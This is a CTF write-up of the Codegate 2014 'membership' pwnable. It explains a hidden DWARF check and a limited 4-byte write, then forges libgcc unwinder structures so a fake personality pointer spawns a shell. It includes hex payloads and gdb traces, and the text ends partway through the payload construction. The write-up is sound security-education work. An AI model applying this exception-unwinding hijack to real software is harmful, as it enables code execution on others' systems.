---
title: 'Codegate 2014: membership (800pt pwnable) write-up'
layout: post
excerpt_separator: <!--more-->
authors:
  - Brian Pak (Cai)
categories:
  - Pwn
ctf: Codegate CTF Quals
year: 2014
---
This is a write-up for 800 point pwnable challenge called "membership" from Codegate CTF 2014 Pre-qual round. PPP was the only solver for this challenge during the competition, so I have decided to do a write-up for the challenge. Enjoy.  (awesie and ricky solved it during the competition.)

<!--more-->

*If you have any trouble with poor formatting here, you can read the original post at <a href="https://www.bpak.org/blog/2014/02/codegate-2014-membership-800pt-pwnable-write-up" target="_blank">this blog</a>.*

## Challenge overview

You can download the copy of the binary <a href="https://www.bpak.org/blog/wp-content/uploads/2014/02/membership" target="_blank">here</a>.
During the competition, we could ssh into one of their machines to exploit and read the flag.

![](https://www.bpak.org/blog/wp-content/uploads/2014/02/membership_1.png)

```
$ file membership
membership: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0c19bb6578cf047d8f3150628d1d82d4a205ea1d, stripped
```

As you can see, it's a 32-bit ELF binary. So, let's open it up in IDA and start reversing.

![](https://www.bpak.org/blog/wp-content/uploads/2014/02/membership_3.png)

The program looks really simple. It just installs a couple signal handlers (specifically for SIGSEGV and SIGFPE) and calls a main (interesting) function, where it prompts us for the *userid* and *password*. Then, the program calculates SHA256 hash of the given password and compares with the stored hash. If the password hashes do not match, a runtime error exception is thrown and the program is aborted. If we pass in the correct password, we get a shell :)

Since guessing the correct password or cracking the hash is not viable option for us, we try to locate some other bugs that can be useful.

```
{
  int v0; // ebx@4
  char v2; // [sp+18h] [bp-10h]@4
  char v3; // [sp+1Fh] [bp-9h]@4

  memset(&unk_804B120, 0, 0xB0u);
  write(1, "userid :: ", 0xAu);
  fgets(userid_buf, 16, stdin);
  write(1, "password :: ", 0xCu);
  fgets(password_buf, 16, stdin);
  SHA256_Init(&unk_804B120);
  SHA256_Update(&unk_804B120, password_buf, 15);
  SHA256_Final((int)my_pw_hash, (int)&unk_804B120);
  if ( strlen(password_buf) &gt;= 0xF )
    ::v0 = 0;
    // mov eax, 0
    // mov dword ptr [eax], 0

  if ( memcmp(my_pw_hash, pw_hash, 0x21u) )
  {
    v0 = __cxa_allocate_exception(8);
    std::allocator&lt;char&gt;::allocator(&v3);
    std::string::string(&v2, "access denied", &v3);
    std::runtime_error::runtime_error(v0, &v2);
    std::string::~string(&v2);
    std::allocator&lt;char&gt;::~allocator(&v3);
    __cxa_throw(v0, &`typeinfo for'std::runtime_error, (const char *)&std::runtime_error::~runtime_error);
  }
  return execlp("/bin/sh", "/bin/sh", 0);
}
```

As highlighted above, the program dereferences a null pointer (`*0 = 0`) if the length of the password is greater than or equal to 16 bytes. Obviously it is going to trigger SIGSEGV, but do you remember what we said earlier about installing the signal handlers? And yes, one of them was SIGSEGV handler.

So, instead of crashing it miserably, the handler will be called.
Let's examine what this handler does.

![](https://www.bpak.org/blog/wp-content/uploads/2014/02/membership_4.png)

Now, if we look at the SIGSEGV_handler, we may think it doesn't really do anything useful.
Note that it just fills up exception information and calls `cxa_throw` to throw exception.

```
void __noreturn SIGSEGV_handler()
{
  int v0; // ebx@1
  char v1; // [sp+18h] [bp-10h]@1
  char v2; // [sp+1Fh] [bp-9h]@1

  v0 = __cxa_allocate_exception(8);
  std::allocator&lt;char&gt;::allocator(&v2);
  std::string::string(&v1, "Segmentation fault", &v2);
  std::runtime_error::runtime_error(v0, &v1);
  std::string::~string(&v1);
  std::allocator&lt;char&gt;::~allocator(&v2);
  __cxa_throw(v0, &`typeinfo for'std::runtime_error, (const char *)&std::runtime_error::~runtime_error);
}
```

At this point, we could go on and explain what SIGFPE_handler does as well, but we'll skip it since it's not that interesting and is not needed for a successful exploitation.
You may ask &mdash; so, what's left?

## Vulnerability

Notice that this is a C++ program with exception throwing. We should check how C++ exception handling works.

It uses a thing called, [DWARF](http://en.wikipedia.org/wiki/DWARF), which is a standardized debugging data format for unwinding the stack and handling exceptions.

*There was a CTF problem in the past that involved DWARF (called Khazad from Ghost in the Shellcode 2012): Check out these write-ups if you are interested!*

  * *[oxff's write-up](http://blog.oxff.net/#k6jx7ewsq2bbid6giflq)*
  * *[Eindbazen's write-up](http://eindbazen.net/2012/01/gits-2012-finals-khazad-pwn600)*

Anyways, you can find DWARF information can be displayed by using binutils such as *objdump* or *readelf*:

```
$ readelf -w membership
Contents of the .eh_frame section:

00000000 00000014 00000000 CIE
  Version:               1
  Augmentation:          "zR"
  Code alignment factor: 1
  Data alignment factor: -4
  Return address column: 8
  Augmentation data:     1b

  DW_CFA_def_cfa: r4 (esp) ofs 4
  DW_CFA_offset: r8 (eip) at cfa-4
  DW_CFA_nop
  DW_CFA_nop

...
(omitted)
...

0000010c 00000070 000000f8 FDE cie=00000018 pc=08048fa7..0804904d
  Augmentation data:     0c 98 04 08

  DW_CFA_advance_loc: 1 to 08048fa8
  DW_CFA_def_cfa_offset: 8
  DW_CFA_offset: r5 (ebp) at cfa-8
  DW_CFA_advance_loc: 2 to 08048faa
  DW_CFA_def_cfa_register: r5 (ebp)
  DW_CFA_advance_loc: 5 to 08048faf
  DW_CFA_offset: r6 (esi) at cfa-12
  DW_CFA_offset: r3 (ebx) at cfa-16
  DW_CFA_val_expression: r8 (eip) (DW_OP_addr: 804b1b0; DW_OP_deref; DW_OP_const4u: 50598931; DW_OP_const4u: 1616928864; DW_OP_plus; DW_OP_ne; DW_OP_bra: 50; DW_OP_addr: 804b1b4; DW_OP_deref; DW_OP_const4u: 84480008; DW_OP_const4u: 1616928864; DW_OP_plus; DW_OP_ne; DW_OP_bra: 29; DW_OP_addr: 804b1c1; DW_OP_deref; DW_OP_const4u: 8; DW_OP_shr; DW_OP_const4u: 4206257; DW_OP_ne; DW_OP_bra: 8; DW_OP_addr: 8048cbc; DW_OP_skip: 5; DW_OP_addr: 8048f18)
  DW_CFA_nop
  DW_CFA_nop
  DW_CFA_nop

...
(omitted)
...
```

Take a close look at the entry with "pc=08048fa7..0804904d".
This entry basically describes what should happen when the exception is thrown between that PC range. Note that the SIGSEGV_handler throws an exception at `0x0804901A` , which is in that range (that range is precisely  SIGSEGV_handler function).

Ok. Now, we have to make sense of what all those operations mean :)
`DW_CFA_val_expression` contains CFA expressions that are defined [here](http://www.dwarfstd.org/doc/040408.1.html).

Luckily, it's not that hard to understand the expressions. We can simply think of it as a stack machine:

```
DW_OP_addr: 804b1b0         // push 0x804b1b0 (this is userid_buf)
DW_OP_deref                 // dereference in-place
DW_OP_const4u: 50598931     // push 50598931
DW_OP_const4u: 1616928864   // push 1616928864
DW_OP_plus                  // add =&gt; hex(50598931 + 1616928864)[2:].decode('hex') =&gt; 'cdts'
DW_OP_ne                    // compare not equal
DW_OP_bra: 50               // branch to END
DW_OP_addr: 804b1b4         // push 0x804b1b4 (this is userid_buf+4)
DW_OP_deref                 // dreference in-place
DW_OP_const4u: 84480008     // push 84480008
DW_OP_const4u: 1616928864   // push 1616928864
DW_OP_plus                  // add =&gt; hex(8448008 + 1616928864)[2:].decode('hex') ==&gt; 'eiph'
DW_OP_ne                    // compare not equal
DW_OP_bra: 29               // branch to END
DW_OP_addr: 804b1c1         // push 0x804b1c1 (this is password_buf+1)
DW_OP_deref                 // dereference in-place
DW_OP_const4u: 8            // push 8
DW_OP_shr                   // shift right (*0x804b1c1 by 8)
DW_OP_const4u: 4206257      // push 4206257 =&gt; 0x402eb1
DW_OP_ne                    // compare not equal
DW_OP_bra: 8                // branch to END
DW_OP_addr: 8048cbc         // push 0x8048cbc
DW_OP_skip: 5               // skip 5
DW_OP_addr: 8048f18         // push 0x8048f18  (this is END)
```

So, in short, it checks if the username is **"stdchpie"** and the **password[2:5]** is equal to **"\xb1\x2e\x40"**.
If any of the condition fails, it transfers execution to `0x8048f18`, which does `exit(0)`.

What happens if we satisfy the conditions? Good question.
It basically dumps us to the following code:

```
.text:08048CE8                 mov     [esp], eax
.text:08048CEB                 call    ___cxa_begin_catch
.text:08048CF0                 mov     dword ptr [esp], offset aNested ; "nested"
.text:08048CF7                 call    _puts
.text:08048CFC                 mov     eax, (offset password_buf+1)
.text:08048D01                 mov     eax, [eax]
.text:08048D03                 mov     edx, (offset password_buf+1)
.text:08048D08                 mov     edx, [edx+4]
.text:08048D0B                 mov     [eax], edx
.text:08048D0D                 call    ___cxa_end_catch
.text:08048D12                 jmp     short loc_8048CC0
```

This code prints out "nested" string and writes `password[5:9]` to `*password[1:5]`. Meaning, we get to write anything in `0x402eb1??` address space with any 4 byte value we choose. 4-byte write is pretty strong tool in exploitation, but when we are limited to 256 byte range, it's difficult to make it useful. Also, it immediately jumps to `0x8048cc0` , where it does another null pointer dereference causing SIGSEGV to happen &mdash; thus, we get infinite "nested" string printed out.

Alright. Let's summarize what we know and have so far.

1. We can trigger a null pointer dereference, causing SIGSEGV handler to get executed (and thus, DWARF CFA expressions), by sending a password that's >= 16 bytes.

2. With carefully constructed password, we can overwrite any 4-byte value to any address in between `0x402eb100` and `0x402eb1ff`.

The natural question is, then, **what is mapped on that memory address?**
With `ulimit -s unlimited`,

```
(gdb) info proc map
process 6207
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x804a000     0x2000        0x0 /tmp/.ppp/membership
         0x804a000  0x804b000     0x1000     0x1000 /tmp/.ppp/membership
         0x804b000  0x804c000     0x1000     0x2000 /tmp/.ppp/membership
        0x40000000 0x40020000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.17.so

... (omitted) ...

        0x402cf000 0x402ea000    0x1b000        0x0 /lib/i386-linux-gnu/libgcc_s.so.1
        0x402ea000 0x402eb000     0x1000    0x1a000 /lib/i386-linux-gnu/libgcc_s.so.1
        0x402eb000 0x402ec000     0x1000    0x1b000 /lib/i386-linux-gnu/libgcc_s.so.1
        0x402ec000 0x4049a000   0x1ae000        0x0 /lib/i386-linux-gnu/libc-2.17.so
        0x4049a000 0x4049c000     0x2000   0x1ae000 /lib/i386-linux-gnu/libc-2.17.so
        0x4049c000 0x4049d000     0x1000   0x1b0000 /lib/i386-linux-gnu/libc-2.17.so
        0x4049d000 0x404a0000     0x3000        0x0
        0x404a0000 0x404a3000     0x3000        0x0 /lib/i386-linux-gnu/libdl-2.17.so

... (omitted) ...

        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```

As we can see above (highlighted), the address range falls into **libgcc**'s memory &mdash; specifically, it matched portion of its **.bss** section.

So, what is there in libgcc_s.so.1, you ask.

![](https://www.bpak.org/blog/wp-content/uploads/2014/02/membership_5.png)

Precisely, this.

And that's it.

At this point, we downloaded and opened up libgcc source code to look at where some of these data structures are used, and tried to look for ways to get an EIP control.

So the journey begins.

## libgcc source code analysis

Note that this step took the longest since we had to actually understand part of the gcc code when it does stack unwinding and handling the exception.

You can download the source for gcc <a href="http://archive.ubuntu.com/ubuntu/pool/main/g/gcc-4.8/gcc-4.8_4.8.1.orig.tar.gz" target="_blank">here</a> (gcc-4.8.1, Ubuntu 13.01).

During the competition, we chose each data structure of interest and traced backwards to find out whether by controlling said structure we can influence anything (e.g. function pointer) on callers while handling exceptions to hijack the control flow.

Since we now know which one can be used to control EIP, we will start from there: <strong>frame_hdr_cache_head</strong> is our target. [It is very well be possible to solve the challenge with different method/structure, but this is the one that we ended up using during the CTF.]

If we locate the place that **frame_hdr_cache_head** is referenced, we land in the middle of **\_Unwind_IteratePhdrCallback** function in _libgcc/unwind-dw2-fde.dip.c_.

```
... (omitted) ...
      /* Find data-&gt;pc in shared library cache.
         Set load_base, p_eh_frame_hdr and p_dynamic
         plus match from the cache and goto
         "Read .eh_frame_hdr header." below.  */

      struct frame_hdr_cache_element *cache_entry;

      for (cache_entry = frame_hdr_cache_head;
           cache_entry;
           cache_entry = cache_entry-&gt;link)
        {
          if (data-&gt;pc &gt;= cache_entry-&gt;pc_low
          && data-&gt;pc &lt; cache_entry-&gt;pc_high)
        {
          load_base = cache_entry-&gt;load_base;
          p_eh_frame_hdr = cache_entry-&gt;p_eh_frame_hdr;
          p_dynamic = cache_entry-&gt;p_dynamic;

          /* And move the entry we're using to the head.  */
          if (cache_entry != frame_hdr_cache_head)
            {
              prev_cache_entry-&gt;link = cache_entry-&gt;link;
              cache_entry-&gt;link = frame_hdr_cache_head;
              frame_hdr_cache_head = cache_entry;
            }
          goto found;
        }
... (omitted) ...
```

**frame\_hdr\_cache_head** points to the first element of a singly linked list that contains **frame\_hdr\_cache_element**(s).

The code iterates through the list and finds the entry for `data->pc` in cache. `data->pc` is the program counter of the frame we are trying to handle the exception for.

This cache is filled in as the program discovers exception handler frames (eh_frame).

The following is the struct definition for **frame\_hdr\_cache_element**:

```
static struct frame_hdr_cache_element
{
  _Unwind_Ptr pc_low;
  _Unwind_Ptr pc_high;
  _Unwind_Ptr load_base;
  const ElfW(Phdr) *p_eh_frame_hdr;
  const ElfW(Phdr) *p_dynamic;
  struct frame_hdr_cache_element *link;
} frame_hdr_cache[FRAME_HDR_CACHE_SIZE];
```

So, if we control where **frame\_hdr\_cache_head** points to, we can also construct/control the elements inside. Before we dive into what happens when we find an element in the cache and **goto found**, let's step back for a minute and see if we can even get to here and what that allows us to do.

The function we just looked at (**\_Unwind\_IteratePhdrCallback**) is called from **\_Unwind\_Find_FDE** in *unwind-dw2-fde-dip.c*.
Then, **\_Unwind\_Find_FDE** function is called from **uw\_frame\_state_for** function in *unwind-dw2.c*.
**uw\_frame\_state_for** function is called from **\_Unwind\_RaiseException** function in *unwind.inc*, which provides an interface to raise an exception given an exception object.

Where does **\_Unwind\_RaiseException** get called, then?
It gets called by **\_\_cxa\_throw**, and if you remember, our SIGSEGV_handler invokes this function to raise an exception.

Alright. We now have confirmed that we can get to that code by causing the binary to throw an exception and letting libgcc unwinds/handles the exception.

But is there anything interesting in this code path such that we can give us EIP control? Yes.

Let's review **\_Unwind\_RaiseException** a little bit:

```
... (omitted) ...
/* Raise an exception, passing along the given exception object.  */

_Unwind_Reason_Code LIBGCC2_UNWIND_ATTRIBUTE
_Unwind_RaiseException(struct _Unwind_Exception *exc)
{
  struct _Unwind_Context this_context, cur_context;
  _Unwind_Reason_Code code;

  /* Set up this_context to describe the current stack frame.  */
  uw_init_context (&this_context);
  cur_context = this_context;

  /* Phase 1: Search.  Unwind the stack, calling the personality routine
     with the _UA_SEARCH_PHASE flag set.  Do not modify the stack yet.  */
  while (1)
    {
      _Unwind_FrameState fs;

      /* Set up fs to describe the FDE for the caller of cur_context.  The
         first time through the loop, that means __cxa_throw.  */
      code = uw_frame_state_for (&cur_context, &fs);

      if (code == _URC_END_OF_STACK)
        /* Hit end of stack with no handler found.  */
        return _URC_END_OF_STACK;

      if (code != _URC_NO_REASON)
        /* Some error encountered.  Usually the unwinder doesn't
           diagnose these and merely crashes.  */
        return _URC_FATAL_PHASE1_ERROR;

      /* Unwind successful.  Run the personality routine, if any.  */
      if (fs.personality)
        {
          code = (*fs.personality) (1, _UA_SEARCH_PHASE, exc-&gt;exception_class,
                                    exc, &cur_context);
          if (code == _URC_HANDLER_FOUND)
            break;
          else if (code != _URC_CONTINUE_UNWIND)
            return _URC_FATAL_PHASE1_ERROR;
        }

      /* Update cur_context to describe the same frame as fs.  */
      uw_update_context (&cur_context, &fs);
    }

  /* Indicate to _Unwind_Resume and associated subroutines that this
     is not a forced unwind.  Further, note where we found a handler.  */
  exc-&gt;private_1 = 0;
  exc-&gt;private_2 = uw_identify_context (&cur_context);

  cur_context = this_context;
  code = _Unwind_RaiseException_Phase2 (exc, &cur_context);
  if (code != _URC_INSTALL_CONTEXT)
    return code;

  uw_install_context (&this_context, &cur_context);
}
... (omitted) ...
```

Notice the highlighted lines. What do you see?

A function pointer getting called! And we **\*may\*** be able to control `fs.personality`.
Let's find out!

```
... (omitted) ...
/* Given the _Unwind_Context CONTEXT for a stack frame, look up the FDE for
   its caller and decode it into FS.  This function also sets the
   args_size and lsda members of CONTEXT, as they are really information
   about the caller's frame.  */

static _Unwind_Reason_Code
uw_frame_state_for (struct _Unwind_Context *context, _Unwind_FrameState *fs)
{
  const struct dwarf_fde *fde;
  const struct dwarf_cie *cie;
  const unsigned char *aug, *insn, *end;

  memset (fs, 0, sizeof (*fs));
  context-&gt;args_size = 0;
  context-&gt;lsda = 0;

  if (context-&gt;ra == 0)
    return _URC_END_OF_STACK;

  fde = _Unwind_Find_FDE (context-&gt;ra + _Unwind_IsSignalFrame (context) - 1,
                          &context-&gt;bases);
  if (fde == NULL)
    {
#ifdef MD_FALLBACK_FRAME_STATE_FOR
      /* Couldn't find frame unwind info for this function.  Try a
         target-specific fallback mechanism.  This will necessarily
         not provide a personality routine or LSDA.  */
      return MD_FALLBACK_FRAME_STATE_FOR (context, fs);
#else
      return _URC_END_OF_STACK;
#endif
    }

  fs-&gt;pc = context-&gt;bases.func;

  cie = get_cie (fde);
  insn = extract_cie_info (cie, context, fs);
  if (insn == NULL)
    /* CIE contained unknown augmentation.  */
    return _URC_FATAL_PHASE1_ERROR;

... (omitted) ...
```

Remember that the struct pointer that we are interested in tracing is **fs** (aka 2nd argument).
Wee see here that **\_Unwind\_Find_FDE** is used to get **fde** (which is used to get **cie**), and **extract\_cie\_info** takes **cie** and **fs** as its first and third argument, respectively.

So, what happens in **extract\_cie\_info**?

```
... (omitted) ...
 378 /* Extract any interesting information from the CIE for the translation
 379    unit F belongs to.  Return a pointer to the byte after the augmentation,
 380    or NULL if we encountered an undecipherable augmentation.  */
 381
 382 static const unsigned char *
 383 extract_cie_info (const struct dwarf_cie *cie, struct _Unwind_Context *context,
 384                   _Unwind_FrameState *fs)
 385 {
 386   const unsigned char *aug = cie-&gt;augmentation;
 387   const unsigned char *p = aug + strlen ((const char *)aug) + 1;
 388   const unsigned char *ret = NULL;
 389   _uleb128_t utmp;
 390   _sleb128_t stmp;
 391
 392   /* g++ v2 "eh" has pointer immediately following augmentation string,
 393      so it must be handled first.  */
 394   if (aug[0] == 'e' && aug[1] == 'h')
 395     {
 396       fs-&gt;eh_ptr = read_pointer (p);
 397       p += sizeof (void *);
 398       aug += 2;
 399     }

... (omitted) ...

 454       /* "P" indicates a personality routine in the CIE augmentation.  */
 455       else if (aug[0] == 'P')
 456         {
 457           _Unwind_Ptr personality;
 458
 459           p = read_encoded_value (context, *p, p + 1, &personality);
 460           fs-&gt;personality = (_Unwind_Personality_Fn) personality;
 461           aug += 1;
 462         }

... (omitted) ...
```

Cool.
**extract\_cie\_info** parses **cie** and updates `fs->personality`. We'll work out the details later.

Okay, now, we have to look into **\_Unwind\_Find_FDE** function to find out what it returns (**fde**) is:

```
... (omitted) ...

const fde *
_Unwind_Find_FDE (void *pc, struct dwarf_eh_bases *bases)
{
  struct unw_eh_callback_data data;
  const fde *ret;

  ret = _Unwind_Find_registered_FDE (pc, bases);
  if (ret != NULL)
    return ret;

  data.pc = (_Unwind_Ptr) pc;
  data.tbase = NULL;
  data.dbase = NULL;
  data.func = NULL;
  data.ret = NULL;
  data.check_cache = 1;

  if (dl_iterate_phdr (_Unwind_IteratePhdrCallback, &data) &lt; 0)
    return NULL;

  if (data.ret)
    {
      bases-&gt;tbase = data.tbase;
      bases-&gt;dbase = data.dbase;
      bases-&gt;func = data.func;
    }
  return data.ret;
}

... (omitted) ...
```

As we discussed earlier, **\_Unwind\_Find_FDE** calls **\_Unwind\_IteratePhdrCallback**, which fills the **data** struct.
Then, it returns **data.ret**.

Whoa. After that chain of functions, we now came back to where we started &mdash; **\_Unwind\_IteratePhdrCallback**.

**Warning**: This is a really long function :p

To show a good idea of the call stack, here's a diagram:

![](https://www.bpak.org/blog/wp-content/uploads/2014/02/membership_6.png)

Fortunately, we do not have to look at all of its details. As we learned earlier, the cache for *eh\_frame\_hdr* is looked up and the following is performed in case the entry was found:

```
... (omitted) ...

309  found:
310
311   if (!p_eh_frame_hdr)
312     return 0;
313
314   /* Read .eh_frame_hdr header.  */
315   hdr = (const struct unw_eh_frame_hdr *)
316     __RELOC_POINTER (p_eh_frame_hdr-&gt;p_vaddr, load_base);
317   if (hdr-&gt;version != 1)
318     return 1;
319

... (omitted) ...

352
353   p = read_encoded_value_with_base (hdr-&gt;eh_frame_ptr_enc,
354                                     base_from_cb_data (hdr-&gt;eh_frame_ptr_enc,
355                                                        data),
356                                     (const unsigned char *) (hdr + 1),
357                                     &eh_frame);
358
359   /* We require here specific table encoding to speed things up.
360      Also, DW_EH_PE_datarel here means using PT_GNU_EH_FRAME start
361      as base, not the processor specific DW_EH_PE_datarel.  */
362   if (hdr-&gt;fde_count_enc != DW_EH_PE_omit
363       && hdr-&gt;table_enc == (DW_EH_PE_datarel | DW_EH_PE_sdata4))
364     {
365       _Unwind_Ptr fde_count;
366
367       p = read_encoded_value_with_base (hdr-&gt;fde_count_enc,
368                                         base_from_cb_data (hdr-&gt;fde_count_enc,
369                                                            data),
370                                         p, &fde_count);
371       /* Shouldn't happen.  */
372       if (fde_count == 0)
373         return 1;
374       if ((((_Unwind_Ptr) p) & 3) == 0)
375         {
376           struct fde_table {
377             signed initial_loc __attribute__ ((mode (SI)));
378             signed fde __attribute__ ((mode (SI)));
379           };
380           const struct fde_table *table = (const struct fde_table *) p;
381           size_t lo, hi, mid;
382           _Unwind_Ptr data_base = (_Unwind_Ptr) hdr;
383           fde *f;
384           unsigned int f_enc, f_enc_size;
385           _Unwind_Ptr range;
386
387           mid = fde_count - 1;
388           if (data-&gt;pc &lt; table[0].initial_loc + data_base)
389             return 1;
390           else if (data-&gt;pc &lt; table[mid].initial_loc + data_base)
391             {
392               lo = 0;
393               hi = mid;
394
395               while (lo &lt; hi)
396                 {
397                   mid = (lo + hi) / 2;
398                   if (data-&gt;pc &lt; table[mid].initial_loc + data_base)
399                     hi = mid;
400                   else if (data-&gt;pc &gt;= table[mid + 1].initial_loc + data_base)
401                     lo = mid + 1;
402                   else
403                     break;
404                 }
405
406               gcc_assert (lo &lt; hi);
407             }
408
409           f = (fde *) (table[mid].fde + data_base);
410           f_enc = get_fde_encoding (f);
411           f_enc_size = size_of_encoded_value (f_enc);
412           read_encoded_value_with_base (f_enc & 0x0f, 0,
413                                         &f-&gt;pc_begin[f_enc_size], &range);
414           if (data-&gt;pc &lt; table[mid].initial_loc + data_base + range)
415             data-&gt;ret = f;
416           data-&gt;func = (void *) (table[mid].initial_loc + data_base);
417           return 1;
418         }
419     }

... (omitted) ...
```

Note that `data->ret` is set to **f** on line 415, where **f** is a FDE pointer found by performing binary search.

Comments from unwind-dw2-fde.h briefly describes FDE & CIE lookup:

```
/* Terminology:
   CIE - Common Information Element
   FDE - Frame Descriptor Element

   There is one per function, and it describes where the function code
   is located, and what the register lifetimes and stack layout are
   within the function.

   The data structures are defined in the DWARF specification, although
   not in a very readable way (see LITERATURE).

   Every time an exception is thrown, the code needs to locate the FDE
   for the current function, and starts to look for exception regions
   from that FDE. This works in a two-level search:
   a) in a linear search, find the shared image (i.e. DLL) containing
      the PC
   b) using the FDE table for that shared object, locate the FDE using
      binary search (which requires the sorting).  */
```

Let's review some of the primitive structs and functions that are used in above code to get a better understanding of what's going on. We will make references to these as we explain the code later.

```
static struct frame_hdr_cache_element
{
  _Unwind_Ptr pc_low;
  _Unwind_Ptr pc_high;
  _Unwind_Ptr load_base;
  const ElfW(Phdr) *p_eh_frame_hdr;
  const ElfW(Phdr) *p_dynamic;
  struct frame_hdr_cache_element *link;
} frame_hdr_cache[FRAME_HDR_CACHE_SIZE];

typedef struct
{
  Elf32_Word    p_type;         /* Segment type */
  Elf32_Off     p_offset;       /* Segment file offset */
  Elf32_Addr    p_vaddr;        /* Segment virtual address */
  Elf32_Addr    p_paddr;        /* Segment physical address */
  Elf32_Word    p_filesz;       /* Segment size in file */
  Elf32_Word    p_memsz;        /* Segment size in memory */
  Elf32_Word    p_flags;        /* Segment flags */
  Elf32_Word    p_align;        /* Segment alignment */
} Elf32_Phdr;

struct unw_eh_frame_hdr
{
  unsigned char version;
  unsigned char eh_frame_ptr_enc;
  unsigned char fde_count_enc;
  unsigned char table_enc;
}

struct dwarf_fde
{
  uword length;
  sword CIE_delta;
  unsigned char pc_begin[];
}

struct dwarf_cie
{
  uword length;
  sword CIE_id;
  ubyte version;
  unsigned char augmentation[];
}

struct fde_table
{
  signed initial_loc __attribute__ ((mode (SI)));
  signed fde __attribute__ ((mode (SI)));
}
```

And, these are some functions that are used when parsing data:

```
/* Load an encoded value from memory at P.  The value is returned in VAL;
   The function returns P incremented past the value.  BASE is as given
   by base_of_encoded_value for this encoding in the appropriate context.  */

static const unsigned char *
read_encoded_value_with_base (unsigned char encoding, _Unwind_Ptr base,
                  const unsigned char *p, _Unwind_Ptr *val)

/* Like read_encoded_value_with_base, but get the base from the context
   rather than providing it directly.  */

static inline const unsigned char *
read_encoded_value (struct _Unwind_Context *context, unsigned char encoding,
            const unsigned char *p, _Unwind_Ptr *val)

/* Read an unsigned leb128 value from P, store the value in VAL, return
   P incremented past the value.  We assume that a word is large enough to
   hold any value so encoded; if it is smaller than a pointer on some target,
   pointers should not be leb128 encoded on that target.  */

static const unsigned char *
read_uleb128 (const unsigned char *p, _uleb128_t *val)

/* Given an encoding and an _Unwind_Context, return the base to which
   the encoding is relative.  This base may then be passed to
   read_encoded_value_with_base for use when the _Unwind_Context is
   not available.  */

static _Unwind_Ptr
base_of_encoded_value (unsigned char encoding, struct _Unwind_Context *context)
```

That was a lot of stuff, but don't worry about understanding/remembering all of them since we will go over the logic at somewhat high-level.

When an exception is thrown, the PC is looked up to find a correct FDE for the current function.

  1. First, they search the shared library cache linked-list (which we control the head pointer).
  2. Once the entry is found, they get unw_*eh\_frame\_hdr* (**hdr** variable) by adding **p_vaddr** and **load_base**. Then, they make sure the version of **hdr **is 1.
      * **hdr** also contains the flags for encoding schemes for **eh\_frame\_ptr**, **fde_count**, and **table**.
      * Encoding flag is defined in *unwind-pe.h*, but important ones are: **DW\_EH\_PE_pcrel** (0x10, pc-relative), **DW\_EH\_PE_absptr** (0x00, absolute),  **DW\_EH\_PE_sdata4** (0x0b, signed 4 byte), **DW\_EH\_PE_udata4** (0x03, unsigned 4 byte).
  3. Parse **eh_frame** and **fde_count**
  4. Perform binary search in **table** for the `data->pc`  against `table[i].initial_loc + data_base` , where **data_base** is **hdr**.
  5. When found an element in **table**, set **f** to `table[mid].fde + data_base`  (thus, calculating the FDE pointer).
  6. Final check is done by parsing the **range** to ensure that this FDE record covers data->pc
    (`table[mid].initial_loc + data_base <= data->pc < table[mid].initial_loc + data_base + range` )
  7. `data->ret` is filled with **f**.

It's important to carefully construct a (fake) FDE record since it holds <strong>CIE_delta</strong> field, which is used to locate the CIE record to be parsed later (for personality function pointer).

Only piece that we haven't visited yet is **extract_cie_info**, but we will visit it as we develop an exploit payload :)

## Exploit development

Finally, we can start writing some ~evil~ awesome payload to pwn this binary.

Here's our plan for the attack:

  1. Overwrite **frame_hdr_cache_head** (0x402eb118) to point to our **stdin** buffer (0x40025000 + 0x1c for skipping userid/password/padding)
  2. Construct fake structs:
      * **cache_entry** (frame\_hdr\_cache_element)
      * **p\_eh\_frame_hdr** (Elf32_Phdr)
      * **hdr  **(unw\_eh\_frame_hdr)
      * **table** (fde_table)
      * **fde** (dwarf_fde)
      * **cie** (dwarf_cide)
  3. When creating a fake **cie** struct, we make the personality function pointer `0x8048E97`, where it does `execlp("/bin/sh", "/bin/sh", 0)`, and get a shell!!

Note that the some of the fields in structs are relative offsets, so we need to plan where to put things and link them correctly.

### Trigger

Let's start with a simple payload that would pass the check and trigger the bug.

```
00000000  73 74 64 63 68 70 69 65  0a 41 01 b1 2e 40 41 41  |stdchpie.A...@AA|
00000010  41 41 41 41 41 41 41 41  41                       |AAAAAAAAA|
00000019
```

```
(gdb) r &lt; payload
Starting program: /tmp/.ppp/./membership &lt; trigger
userid :: password ::
Program received signal SIGSEGV, Segmentation fault.
0x08048e01 in ?? ()
(gdb) c
Continuing.
nested

Program received signal SIGSEGV, Segmentation fault.
0x08048cc5 in ?? ()
(gdb) c
Continuing.
nested

Program received signal SIGSEGV, Segmentation fault.
0x08048cc5 in ?? ()
(gdb) x/wx 0x402eb101
0x402eb101:     0x41414141
```

As we can see in action, this payload triggers the bug and causes infinite SIGSEGV.
We currently chose 0x402eb101 for no particular reason, but we can see that memory is successfully written.

### cache\_entry & p\_eh\_frame\_hdr construction

Now, we overwrite **frame\_hdr\_cache_head** to point to our **stdin** buffer.

We are going to start building fake structs from our **buffer + 0x1c**.

So what values should we use?
To not worry about the search too much, we are going to set **pc_low** to **0x0** and **pc_high** to **0xFFFFFFFF**. This basically says that this cache entry should be used for any exception thrown in this range of addresses &mdash; so we'll catch everything. Also, to make it easy to do math, we are going to make **load_base** to ****. Finally, we have to set **p\_eh\_frame_hdr** pointer to the fake **Elf32_Phdr** struct. We will put this fake phdr struct right after our fake cache_entry struct that we are currently building. The rest of the fields are not really used (for our purpose), so we can put dummy values.

This gives us this:

```
*frame_hdr_cache_head:
 | pc_low = 0x00000000
 | pc_high = 0xFFFFFFFF
 | load_base = 0x00000000
 | p_eh_frame_hdr = 0x40025034
 | p_dynamic = 0x43434343
 | link = 0x00000000
```

For **p\_eh\_frame_hdr** struct, we only care about **p_vaddr** which is used to calculate **hdr** (unw\_eh\_frame_hdr).

```
*p_eh_frame_hdr:
 | p_type = 0x6474e550
 | p_offset = 0x44444444
 | p_vaddr = 0x40025054
 | p_paddr = 0x45454545
 | p_filesz = 0x46464646
 | p_memsz = 0x47474747
 | p_flags = 0x48484848
 | p_align = 0x49494949
```

Let's see in action.

```
00000000  73 74 64 63 68 70 69 65  0a 41 18 b1 2e 40 1c 50  |stdchpie.A...@.P|
